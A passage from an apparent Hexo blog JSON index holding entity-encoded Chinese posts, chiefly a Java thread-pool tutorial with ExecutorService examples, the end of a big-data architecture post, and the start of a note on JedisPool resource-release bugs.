4E86;&#x5B9E;&#x65F6;&#x6027;&#x3002; &#x56DB;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;&#x6570;&#x636E;&#x5B58;&#x50A8;(&#x5206;&#x5E03;&#x5F0F;&#x5185;&#x5B58;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;(Tachyon)&#x3001;&#x6570;&#x636E;&#x591A;&#x4ECB;&#x8D28;&#x5206;&#x5C42;&#x5B58;&#x50A8;&#x3001;&#x6570;&#x636E;&#x5217;&#x5F0F;&#x5B58;&#x50A8;)&#x3001;&#x5373;&#x5E2D;&#x67E5;&#x8BE2;(OLAP)&#x3001;&#x8D44;&#x6E90;&#x9694;&#x79BB;&#x3001;&#x6570;&#x636E;&#x5B89;&#x5168;&#x3001;&#x5E73;&#x53F0;&#x5FAE;&#x89C2;&#x5C42;&#x9762;&#x76D1;&#x63A7;&#x3001;&#x6570;&#x636E;&#x5BF9;&#x5916;&#x670D;&#x52A1;&#x7B49;&#x3002; &#x4F5C;&#x8005;&#x4ECB;&#x7ECD;&#xFF1A;&#x738B;&#x52B2;&#xFF1A;&#x76EE;&#x524D;&#x5C31;&#x804C;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#xFF0C;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x5E08;&#xFF0C;&#x8D1F;&#x8D23;&#x9177;&#x72D7;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x89C4;&#x5212;&#x3001;&#x5EFA;&#x8BBE;&#x3001;&#x5E94;&#x7528;&#x3002; 11&#x5E74;&#x7684;IT&#x4ECE;&#x4E1A;&#x7ECF;&#x9A8C;&#xFF0C;2&#x5E74;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x5F00;&#x53D1;&#xFF0C;3&#x5E74;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x5B9E;&#x8DF5;&#x7ECF;&#x9A8C;&#xFF0C;&#x4E3B;&#x8981;&#x7814;&#x7A76;&#x65B9;&#x5411;&#x6D41;&#x5F0F;&#x8BA1;&#x7B97;&#x3001;&#x5927;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x3001;NoSQL&#x3001;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x7B49;&#x3002;","raw":null,"content":null,"categories":[{"name":"我的收藏","slug":"我的收藏","permalink":"http://www.wangxin123.com/categories/我的收藏/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"http://www.wangxin123.com/tags/大数据/"}]},{"title":"Java线程池","slug":"线程池","date":"2016-06-20T10:53:00.000Z","updated":"2016-11-17T11:59:42.682Z","comments":true,"path":"2016/06/20/线程池/","link":"","permalink":"http://www.wangxin123.com/2016/06/20/线程池/","excerpt":"&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x7EBF;&#x7A0B;&#x6C60; &#x51CF;&#x5C11;&#x4E86;&#x521B;&#x5EFA;&#x548C;&#x9500;&#x6BC1;&#x7EBF;&#x7A0B;&#x7684;&#x6B21;&#x6570;&#xFF0C;&#x6BCF;&#x4E2A;&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x90FD;&#x53EF;&#x4EE5;&#x88AB;&#x91CD;&#x590D;&#x5229;&#x7528;&#xFF0C;&#x53EF;&#x6267;&#x884C;&#x591A;&#x4E2A;&#x4EFB;&#x52A1;&#x3002; &#x53EF;&#x4EE5;&#x6839;&#x636E;&#x7CFB;&#x7EDF;&#x7684;&#x627F;&#x53D7;&#x80FD;&#x529B;&#xFF0C;&#x8C03;&#x6574;&#x7EBF;&#x7A0B;&#x6C60;&#x4E2D;&#x5DE5;&#x4F5C;&#x7EBF;&#x7EBF;&#x7A0B;&#x7684;&#x6570;&#x76EE;&#xFF0C;&#x9632;&#x6B62;&#x56E0;&#x4E3A;&#x6D88;&#x8017;&#x8FC7;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x800C;&#x628A;&#x670D;&#x52A1;&#x5668;&#x7D2F;&#x8DB4;&#x4E0B;(&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x9700;&#x8981;&#x5927;&#x7EA6;1MB&#x5185;&#x5B58;&#xFF0C;&#x7EBF;&#x7A0B;&#x5F00;&#x7684;&#x8D8A;&#x591A;&#xFF0C;&#x6D88;&#x8017;&#x7684;&#x5185;&#x5B58;&#x4E5F;&#x5C31;&#x8D8A;&#x5927;&#xFF0C;&#x6700;&#x540E;&#x6B7B;&#x673A;)&#x3002; Java&#x91CC;&#x9762;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x9876;&#x7EA7;&#x63A5;&#x53E3;&#x662F;Executor&#xFF0C;&#x4F46;&#x662F;&#x4E25;&#x683C;&#x610F;&#x4E49;&#x4E0A;&#x8BB2;Executor&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x800C;&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x6267;&#x884C;&#x7EBF;&#x7A0B;&#x7684;&#x5DE5;&#x5177;&#x3002;&#x771F;&#x6B63;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x63A5;&#x53E3;&#x662F;ExecutorService&#x3002; &#x7C7B;&#x540D; &#x8BF4;&#x660E; ExecutorService &#x771F;&#x6B63;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x63A5;&#x53E3;&#x3002; ThreadPoolExecutor ExecutorService&#x7684;&#x9ED8;&#x8BA4;&#x5B9E;&#x73B0;&#x3002; ScheduledExecutorService &#x80FD;&#x548C;Timer/TimerTask&#x7C7B;&#x4F3C;&#xFF0C;&#x89E3;&#x51B3;&#x90A3;&#x4E9B;&#x9700;&#x8981;&#x4EFB;&#x52A1;&#x91CD;&#x590D;&#x6267;&#x884C;&#x7684;&#x95EE;&#x9898;&#x3002; ScheduledThreadPoolExecutor &#x7EE7;&#x627F;ThreadPoolExecutor&#x7684;ScheduledExecutorService&#x63A5;&#x53E3;&#x5B9E;&#x73B0;&#xFF0C;&#x5468;&#x671F;&#x6027;&#x4EFB;&#x52A1;&#x8C03;&#x5EA6;&#x7684;&#x7C7B;&#x5B9E;&#x73B0;&#x3002;","keywords":null,"text":"&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x7EBF;&#x7A0B;&#x6C60; &#x51CF;&#x5C11;&#x4E86;&#x521B;&#x5EFA;&#x548C;&#x9500;&#x6BC1;&#x7EBF;&#x7A0B;&#x7684;&#x6B21;&#x6570;&#xFF0C;&#x6BCF;&#x4E2A;&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x90FD;&#x53EF;&#x4EE5;&#x88AB;&#x91CD;&#x590D;&#x5229;&#x7528;&#xFF0C;&#x53EF;&#x6267;&#x884C;&#x591A;&#x4E2A;&#x4EFB;&#x52A1;&#x3002; &#x53EF;&#x4EE5;&#x6839;&#x636E;&#x7CFB;&#x7EDF;&#x7684;&#x627F;&#x53D7;&#x80FD;&#x529B;&#xFF0C;&#x8C03;&#x6574;&#x7EBF;&#x7A0B;&#x6C60;&#x4E2D;&#x5DE5;&#x4F5C;&#x7EBF;&#x7EBF;&#x7A0B;&#x7684;&#x6570;&#x76EE;&#xFF0C;&#x9632;&#x6B62;&#x56E0;&#x4E3A;&#x6D88;&#x8017;&#x8FC7;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x800C;&#x628A;&#x670D;&#x52A1;&#x5668;&#x7D2F;&#x8DB4;&#x4E0B;(&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x9700;&#x8981;&#x5927;&#x7EA6;1MB&#x5185;&#x5B58;&#xFF0C;&#x7EBF;&#x7A0B;&#x5F00;&#x7684;&#x8D8A;&#x591A;&#xFF0C;&#x6D88;&#x8017;&#x7684;&#x5185;&#x5B58;&#x4E5F;&#x5C31;&#x8D8A;&#x5927;&#xFF0C;&#x6700;&#x540E;&#x6B7B;&#x673A;)&#x3002; Java&#x91CC;&#x9762;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x9876;&#x7EA7;&#x63A5;&#x53E3;&#x662F;Executor&#xFF0C;&#x4F46;&#x662F;&#x4E25;&#x683C;&#x610F;&#x4E49;&#x4E0A;&#x8BB2;Executor&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x800C;&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x6267;&#x884C;&#x7EBF;&#x7A0B;&#x7684;&#x5DE5;&#x5177;&#x3002;&#x771F;&#x6B63;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x63A5;&#x53E3;&#x662F;ExecutorService&#x3002; &#x7C7B;&#x540D; &#x8BF4;&#x660E; ExecutorService &#x771F;&#x6B63;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x63A5;&#x53E3;&#x3002; ThreadPoolExecutor ExecutorService&#x7684;&#x9ED8;&#x8BA4;&#x5B9E;&#x73B0;&#x3002; ScheduledExecutorService &#x80FD;&#x548C;Timer/TimerTask&#x7C7B;&#x4F3C;&#xFF0C;&#x89E3;&#x51B3;&#x90A3;&#x4E9B;&#x9700;&#x8981;&#x4EFB;&#x52A1;&#x91CD;&#x590D;&#x6267;&#x884C;&#x7684;&#x95EE;&#x9898;&#x3002; ScheduledThreadPoolExecutor &#x7EE7;&#x627F;ThreadPoolExecutor&#x7684;ScheduledExecutorService&#x63A5;&#x53E3;&#x5B9E;&#x73B0;&#xFF0C;&#x5468;&#x671F;&#x6027;&#x4EFB;&#x52A1;&#x8C03;&#x5EA6;&#x7684;&#x7C7B;&#x5B9E;&#x73B0;&#x3002; &#x5E38;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;&#x8981;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6C60;&#x662F;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x7684;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5BF9;&#x4E8E;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x539F;&#x7406;&#x4E0D;&#x662F;&#x5F88;&#x6E05;&#x695A;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x914D;&#x7F6E;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x4E0D;&#x662F;&#x8F83;&#x4F18;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5728;Executors&#x7C7B;&#x91CC;&#x9762;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E9B;&#x9759;&#x6001;&#x5DE5;&#x5382;&#xFF0C;&#x751F;&#x6210;&#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x3002; newCachedThreadPool &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EF;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5982;&#x679C;&#x7EBF;&#x7A0B;&#x6C60;&#x957F;&#x5EA6;&#x8D85;&#x8FC7;&#x5904;&#x7406;&#x9700;&#x8981;&#xFF0C;&#x53EF;&#x7075;&#x6D3B;&#x56DE;&#x6536;&#x7A7A;&#x95F2;&#x7EBF;&#x7A0B;&#xFF0C;&#x82E5;&#x65E0;&#x53EF;&#x56DE;&#x6536;&#xFF0C;&#x5219;&#x65B0;&#x5EFA;&#x7EBF;&#x7A0B;&#x3002; newFixedThreadPool &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x53EF;&#x63A7;&#x5236;&#x7EBF;&#x7A0B;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x6570;&#xFF0C;&#x8D85;&#x51FA;&#x7684;&#x7EBF;&#x7A0B;&#x4F1A;&#x5728;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x3002; newScheduledThreadPool &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x652F;&#x6301;&#x5B9A;&#x65F6;&#x53CA;&#x5468;&#x671F;&#x6027;&#x4EFB;&#x52A1;&#x6267;&#x884C;&#x3002; newSingleThreadExecutor &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5355;&#x7EBF;&#x7A0B;&#x5316;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5B83;&#x53EA;&#x4F1A;&#x7528;&#x552F;&#x4E00;&#x7684;&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x6765;&#x6267;&#x884C;&#x4EFB;&#x52A1;&#xFF0C;&#x4FDD;&#x8BC1;&#x6240;&#x6709;&#x4EFB;&#x52A1;&#x6309;&#x7167;&#x6307;&#x5B9A;&#x987A;&#x5E8F;(FIFO, LIFO, &#x4F18;&#x5148;&#x7EA7;)&#x6267;&#x884C;&#x3002; 1&#x3001;newCachedThreadPool&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EF;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5982;&#x679C;&#x7EBF;&#x7A0B;&#x6C60;&#x957F;&#x5EA6;&#x8D85;&#x8FC7;&#x5904;&#x7406;&#x9700;&#x8981;&#xFF0C;&#x53EF;&#x7075;&#x6D3B;&#x56DE;&#x6536;&#x7A7A;&#x95F2;&#x7EBF;&#x7A0B;&#xFF0C;&#x82E5;&#x65E0;&#x53EF;&#x56DE;&#x6536;&#xFF0C;&#x5219;&#x65B0;&#x5EFA;&#x7EBF;&#x7A0B;&#x3002;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;12345678910111213141516ExecutorService cachedThreadPool = Executors.newCachedThreadPool();for (int i = 0; i &lt; 10; i++) { final int index = i; try { Thread.sleep(index * 1000); } catch (InterruptedException e) { e.printStackTrace(); } cachedThreadPool.execute(new Runnable() { @Override public void run() { System.out.println(index); } });} &#x7EBF;&#x7A0B;&#x6C60;&#x4E3A;&#x65E0;&#x9650;&#x5927;&#xFF0C;&#x5F53;&#x6267;&#x884C;&#x7B2C;&#x4E8C;&#x4E2A;&#x4EFB;&#x52A1;&#x65F6;&#x7B2C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;&#x5DF2;&#x7ECF;&#x5B8C;&#x6210;&#xFF0C;&#x4F1A;&#x590D;&#x7528;&#x6267;&#x884C;&#x7B2C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x800C;&#x4E0D;&#x7528;&#x6BCF;&#x6B21;&#x65B0;&#x5EFA;&#x7EBF;&#x7A0B;&#x3002; &#x5BF9;&#x4E8E;&#x9700;&#x8981;&#x6267;&#x884C;&#x5F88;&#x591A;&#x77ED;&#x671F;&#x5F02;&#x6B65;&#x4EFB;&#x52A1;&#x7684;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#x53EF;&#x4EE5;&#x63D0;&#x9AD8;&#x7A0B;&#x5E8F;&#x6027;&#x80FD;&#xFF0C;&#x56E0;&#x4E3A;&#x957F;&#x65F6;&#x95F4;&#x4FDD;&#x6301;&#x7A7A;&#x95F2;&#x7684;&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x4E0D;&#x4F1A;&#x5360;&#x7528;&#x4EFB;&#x4F55;&#x8D44;&#x6E90;&#xFF0C;&#x8C03;&#x7528;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#x5BF9;&#x8C61;&#x5C06;&#x91CD;&#x7528;&#x4EE5;&#x524D;&#x6784;&#x9020;&#x7684;&#x7EBF;&#x7A0B;&#xFF08;&#x7EBF;&#x7A0B;&#x53EF;&#x7528;&#x72B6;&#x6001;&#xFF09;&#xFF0C;&#x82E5;&#x7EBF;&#x7A0B;&#x6CA1;&#x6709;&#x53EF;&#x7528;&#x7684;&#xFF0C;&#x5219;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7EBF;&#x7A0B;&#x6DFB;&#x52A0;&#x5230;&#x6C60;&#x4E2D;&#xFF0C;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#x5C06;&#x7EC8;&#x6B62;&#x5E76;&#x4ECE;&#x6C60;&#x4E2D;&#x79FB;&#x9664;60&#x79D2;&#x672A;&#x88AB;&#x4F7F;&#x7528;&#x7684;&#x7EBF;&#x7A0B;&#x3002; 2&#x3001;newFixedThreadPool&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x53EF;&#x63A7;&#x5236;&#x7EBF;&#x7A0B;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x6570;&#xFF0C;&#x8D85;&#x51FA;&#x7684;&#x7EBF;&#x7A0B;&#x4F1A;&#x5728;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x3002;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A; 1234567891011121314151617ExecutorService fixedThreadPool = Executors.newFixedThreadPool(3);for (int i = 0; i &lt; 10; i++) { final int index = i; fixedThreadPool.execute(new Runnable() { @Override public void run() { try { System.out.println(index); Thread.sleep(2000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } } });} &#x56E0;&#x4E3A;&#x7EBF;&#x7A0B;&#x6C60;&#x5927;&#x5C0F;&#x4E3A;3&#xFF0C;&#x6BCF;&#x4E2A;&#x4EFB;&#x52A1;&#x8F93;&#x51FA;index&#x540E;sleep 2&#x79D2;&#xFF0C;&#x6240;&#x4EE5;&#x6BCF;&#x4E24;&#x79D2;&#x6253;&#x5370;3&#x4E2A;&#x6570;&#x5B57;&#x3002;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x5927;&#x5C0F;&#x6700;&#x597D;&#x6839;&#x636E;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x3002;&#x5982;Runtime.getRuntime().availableProcessors()&#x3002;&#x53EF;&#x53C2;&#x8003;PreloadDataCache&#x3002; 3&#x3001;newScheduledThreadPool&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x652F;&#x6301;&#x5B9A;&#x65F6;&#x53CA;&#x5468;&#x671F;&#x6027;&#x4EFB;&#x52A1;&#x6267;&#x884C;&#x3002;&#x5EF6;&#x8FDF;&#x6267;&#x884C;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A; 12345678ScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(5);scheduledThreadPool.schedule(new Runnable() { @Override public void run() { System.out.println(&quot;delay 3 seconds&quot;); }}, 3, TimeUnit.SECONDS); &#x8868;&#x793A;&#x5EF6;&#x8FDF;3&#x79D2;&#x6267;&#x884C;&#x3002; &#x5B9A;&#x671F;&#x6267;&#x884C;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;1234567scheduledThreadPool.scheduleAtFixedRate(new Runnable() { @Override public void run() { System.out.println(&quot;delay 1 seconds, and excute every 3 seconds&quot;); }}, 1, 3, TimeUnit.SECONDS); &#x8868;&#x793A;&#x5EF6;&#x8FDF;1&#x79D2;&#x540E;&#x6BCF;3&#x79D2;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;ScheduledExecutorService&#x6BD4;Timer&#x66F4;&#x5B89;&#x5168;&#xFF0C;&#x529F;&#x80FD;&#x66F4;&#x5F3A;&#x5927;&#x3002;&#x53C2;&#x6570;5&#x6307;&#x7684;&#x662F;&#x7EBF;&#x7A0B;&#x6C60;&#x4E2D;&#x9700;&#x8981;&#x4FDD;&#x6301;&#x7684;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x5373;&#x4FBF;&#x8FD9;&#x4E9B;&#x7EBF;&#x7A0B;&#x90FD;&#x662F;&#x7A7A;&#x95F2;&#x7684; 4&#x3001;newSingleThreadExecutor&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5355;&#x7EBF;&#x7A0B;&#x5316;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5B83;&#x53EA;&#x4F1A;&#x7528;&#x552F;&#x4E00;&#x7684;&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x6765;&#x6267;&#x884C;&#x4EFB;&#x52A1;&#xFF0C;&#x4FDD;&#x8BC1;&#x6240;&#x6709;&#x4EFB;&#x52A1;&#x6309;&#x7167;&#x6307;&#x5B9A;&#x987A;&#x5E8F;(FIFO, LIFO, &#x4F18;&#x5148;&#x7EA7;)&#x6267;&#x884C;&#x3002;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A; 1234567891011121314151617ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();for (int i = 0; i &lt; 10; i++) { final int index = i; singleThreadExecutor.execute(new Runnable() { @Override public void run() { try { System.out.println(index); Thread.sleep(2000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } } });} &#x7ED3;&#x679C;&#x4F9D;&#x6B21;&#x8F93;&#x51FA;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x5404;&#x4E2A;&#x4EFB;&#x52A1;&#x3002;&#x73B0;&#x884C;&#x5927;&#x591A;&#x6570;GUI&#x7A0B;&#x5E8F;&#x90FD;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x7684;&#x3002;Android&#x4E2D;&#x5355;&#x7EBF;&#x7A0B;&#x53EF;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#xFF0C;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#xFF0C;&#x5E94;&#x7528;&#x6279;&#x91CF;&#x5B89;&#x88C5;&#xFF0C;&#x5E94;&#x7528;&#x6279;&#x91CF;&#x5220;&#x9664;&#x7B49;&#x4E0D;&#x9002;&#x5408;&#x5E76;&#x53D1;&#x4F46;&#x53EF;&#x80FD;IO&#x963B;&#x585E;&#x6027;&#x53CA;&#x5F71;&#x54CD;UI&#x7EBF;&#x7A0B;&#x54CD;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x3002;","raw":null,"content":null,"categories":[{"name":"WEB后端","slug":"WEB后端","permalink":"http://www.wangxin123.com/categories/WEB后端/"}],"tags":[{"name":"线程池","slug":"线程池","permalink":"http://www.wangxin123.com/tags/线程池/"}]},{"title":"Jedis-returnResource使用注意事项","slug":"Jedis-returnResource使用注意事项","date":"2016-06-18T12:10:00.000Z","updated":"2017-01-02T08:35:44.734Z","comments":true,"path":"2016/06/18/Jedis-returnResource使用注意事项/","link":"","permalink":"http://www.wangxin123.com/2016/06/18/Jedis-returnResource使用注意事项/","excerpt":"&#x9047;&#x5230;&#x8FC7;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x4E25;&#x91CD;&#x95EE;&#x9898;&#xFF1A;&#x53D1;&#x5E03;&#x7684;&#x9879;&#x76EE;&#x4E0D;&#x77E5;&#x4ECE;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x5F00;&#x59CB;&#xFF0C;&#x6BCF;&#x6708;&#x4F1A;&#x51FA;&#x73B0;&#x4E00;&#x4E24;&#x6B21;&#x4E32;&#x53F7;&#x95EE;&#x9898;&#x3002;&#x4E32;&#x53F7;&#x73B0;&#x8C61;&#x6307;&#x7684;&#x662F;&#xFF0C;&#x7528;&#x6237;&#x7528;&#x8D26;&#x53F7;A&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#xFF0C;&#x7136;&#x540E;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#xFF0C;&#x767B;&#x5F55;&#x8D26;&#x53F7;&#x81EA;&#x52A8;&#x53D8;&#x6210;&#x4E86;B&#x3002;&#x4E32;&#x53F7;&#x51FA;&#x73B0;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x5B9A;&#xFF0C;&#x6D4B;&#x8BD5;&#x5E73;&#x53F0;&#x96BE;&#x4EE5;&#x91CD;&#x73B0;&#xFF0C;&#x4E14;&#x540E;&#x53F0;&#x68C0;&#x6D4B;&#x4E0D;&#x5230;&#x9519;&#x8BEF;&#xFF0C;&#x96BE;&#x4EE5;&#x5B9A;&#x4F4D;&#x3002;&#x5F53;&#x65F6;&#x5404;&#x79CD;&#x6392;&#x67E5;&#xFF0C;&#x6700;&#x540E;&#x53D1;&#x73B0;&#x95EE;&#x9898;&#x679C;&#x7136;&#x662F;&#x51FA;&#x5728;&#x7F13;&#x5B58;redis&#x4E0A;&#xFF0C;JedisPool&#x4F7F;&#x7528;&#x6709;&#x95EE;&#x9898;&#x3002; JedisPool&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;1&#x3001;&#x6BCF;&#x6B21;&#x4ECE;pool&#x83B7;&#x53D6;&#x8D44;&#x6E90;&#x540E;&#xFF0C;&#x4E00;&#x5B9A;&#x8981;try-finally&#x91CA;&#x653E;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x5F88;&#x591A;&#x83AB;&#x540D;&#x5176;&#x5999;&#x7684;&#x9519;&#x8BEF;&#x3002;2&#x3001;&#x8D44;&#x6E90;&#x91CA;&#x653E;&#x4E0D;&#x80FD;&#x4E00;&#x81F4;&#x4F7F;&#x7528;returnBrokenResource&#x3010;&#x9879;&#x76EE;&#x95EE;&#x9898;&#x5C31;&#x51FA;&#x5728;&#x7B2C;&#x4E8C;&#x6761;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#x4E0A;&#x3011;&#x3002; &#x76F8;&#x5173;&#x4EE3;&#x7801;&#x4EE3;&#x7801;&#x4FEE;&#x6539;&#x524D;&#x5927;&#x81F4;&#x5982;&#x4E0B;:12345public void closeResource(Jedis jedis) { if (null != jedis) { jedisPool.returnResource(jedis); } }","keywords":null,"text":"&#x9047;&#x5230;&#x8FC7;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x4E25;&#x91CD;&#x95EE;&#x9898;&#xFF1A;&#x53D1;&#x5E03;&#x7684;&#x9879;&#x76EE;&#x4E0D;&#x77E5;&#x4ECE;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x5F00;&#x59CB;&#xFF0C;&#x6BCF;&#x6708;&#x4F1A;&#x51FA;&#x73B0;&#x4E00;&#x4E24;&#x6B21;&#x4E32;&#x53F7;&#x95EE;&#x9898;&#x3002;&#x4E32;&#x53F7;&#x73B0;&#x8C61;&#x6307;&#x7684;&#x662F;&#xFF0C;&#x7528;&#x6237;&#x7528;&#x8D26;&#x53F7;A&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#xFF0C;&#x7136;&#x540E;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#xFF0C;&#x767B;&#x5F55;&#x8D26;&#x53F7;&#x81EA;&#x52A8;&#x53D8;&#x6210;&#x4E86;B&#x3002;&#x4E32;&#x53F7;&#x51FA;&#x73B0;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x5B9A;&#xFF0C;&#x6D4B;&#x8BD5;&#x5E73;&#x53F0;&#x96BE;&#x4EE5;&#x91CD;&#x73B0;&#xFF0C;&#x4E14;&#x540E;&#x53F0;&#x68C0;&#x6D4B;&#x4E0D;&#x5230;&#x9519;&#x8BEF;&#xFF0C;&#x96BE;&#x4EE5;&#x5B9A;&#x4F4D;&#x3002;&#x5F53;&#x65F6;&#x5404;&#x79CD;&#x6392;&#x67E5;&#xFF0C;&#x6700;&#x540E;&#x53D1;&#x73B0;&#x95EE;&#x9898;&#x679C;&#x7136;&#x662F;&#x51FA;&#x5728;&#x7F13;&#x5B58;redis&#x4E0A;&#xFF0C;JedisPool&#x4F7F;&#x7528;&#x6709;&#x95EE;&#x9898;&#x3002; JedisPool&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;1&#x3001;&#x6BCF;&#x6B21;&#x4ECE;pool&#x83B7;&#x53D6;&#x8D44;&#x6E90;&#x540E;&#xFF0C;&#x4E00;&#x5B9A;&#x8981;try-finally&#x91CA;&#x653E;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x5F88;&#x591A;&#x83AB;&#x540D;&#x5176;&#x5999;&#x7684;&#x9519;&#x8BEF;&#x3002;2&#x3001;&#x8D44;&#x6E90;&#x91CA;&#x653E;&#x4E0D;&#x80FD;&#x4E00;&#x81F4;&#x4F7F;&#x7528;returnBrokenResource&#x3010;&#x9879;&#x76EE;&#x95EE;&#x9898;&#x5C31;&#x51FA;&#x5728;&#x7B2C;&#x4E8C;&#x6761;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#x4E0A;&#x3011;&#x3002; 